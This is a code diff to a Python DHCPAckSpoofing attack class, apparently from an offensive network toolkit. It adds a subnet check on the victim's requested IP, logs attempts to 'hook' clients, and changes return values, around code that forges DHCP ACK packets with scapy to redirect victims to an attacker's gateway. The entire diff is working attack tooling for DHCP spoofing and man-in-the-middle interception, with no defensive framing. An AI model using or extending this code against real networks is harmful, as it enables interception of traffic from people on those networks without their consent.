@@ -60,6 +60,19 @@ class DHCPAckSpoofing(abstract_attack.AbstractAttack):
         requested_ip = ''
         try:
             requested_ip = next(x for x in dhcp_request_options if x[0] == 'requested_addr')[1]
+
+            #If the client is requesting an IP that dosent belong to our spoofed acces point, do nothing
+            gateway_fields = self.get_value('gateway').split('.')
+            netmask_fields = self.get_value('netmask').split('.')
+            requested_fields = requested_ip.split('.')
+            for gw, rq, nm in zip(gateway_fields, requested_fields, netmask_fields):
+                if int(gw)&int(nm) != int(rq)&int(nm):
+                    print('Client didn\'t requested a valid IP')
+                    print('Requested IP :' + requested_ip)
+                    print('Gateway :' + self.get_value('gateway'))
+                    print('Netmask :' + self.get_value('netmask'))
+                    return False
+
         except StopIteration:
             requested_ip = self.get_value('gateway')
             ip_fields = requested_ip.split('.')
@@ -67,6 +80,8 @@ class DHCPAckSpoofing(abstract_attack.AbstractAttack):
             requested_ip = '.'.join(ip_fields)
 
             print('Client didn\'t requested an ip, trying with ' + requested_ip)
+
+        print('Trying to hook client :' + requested_ip)
 
         spoofed_ack[layers.inet.IP].dst = requested_ip
         spoofed_ack[layers.inet.IP].id = random.randrange(200, 0xFFFF)
@@ -126,8 +141,7 @@ class DHCPAckSpoofing(abstract_attack.AbstractAttack):
 
         sendp(spoofed_ack, iface=self.get_value('interface'), verbose=0)
 
-        #Return IP address we tried to hook the victim to
-        return requested_ip
+        return True
 
     def hook_dhcp_request(self, udp_packet):
         if layers.dhcp.DHCP in udp_packet:
@@ -135,8 +149,7 @@ class DHCPAckSpoofing(abstract_attack.AbstractAttack):
             dhcp_type_index = dhcp_packet.options[0][1]
 
             if dhcp_type_index == 3:
-                target_ip = self.send_spoofed_ack(udp_packet)
-                print('Trying to hook ' + target_ip)
+                self.send_spoofed_ack(udp_packet)
                 # Disabled this check. This should be on another thread as
                 # when the victim is requesting an IP that is NOT available in the area,
                 # multiple dhcp_request are sent. This would block/timeout...failing to send spoofed ACK
